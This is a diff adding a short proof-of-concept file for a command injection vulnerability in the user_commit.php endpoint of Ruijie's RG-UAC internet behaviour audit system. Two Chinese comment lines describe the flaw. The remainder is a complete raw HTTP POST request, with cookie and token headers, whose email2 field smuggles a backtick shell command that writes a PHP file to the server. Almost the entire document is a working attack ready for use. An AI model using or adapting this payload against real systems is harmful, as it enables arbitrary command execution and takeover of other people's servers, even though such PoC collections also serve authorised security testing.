@@ -1,0 +1,11 @@
+# 锐捷RG-UAC统一上网行为管理审计系统user_commit.php远程代码执行漏洞
+# 锐捷RG-UAC中存在命令执行漏洞，应用程序管理网关后端//view/systemConfig/sys_user/user_commit.php接口。攻击者可以执行任意命令来控制服务器权限。
+POST /view/systemConfig/sys_user/user_commit.php?action=add&acid=80051551&bid=hd_tag_m8mv245y HTTP/1.1
+Host: www.swaf.com
+Cookie: PHPSESSID=ebd507c9bc5a4293c3e5e596f37157bf
+RM-PRO-BusinessID: hd_tag_m8mv245y
+RM-PRO-Token: c15b13fe1f586144917f2db395636086
+RM-PRO-Time: 1742808365585
+User-Agent: curl/7.83.1
+
+auth_method=1&pwd_policy=2&email2=`echo+"<?php+phpinfo();?>">1.php`&user_name=1
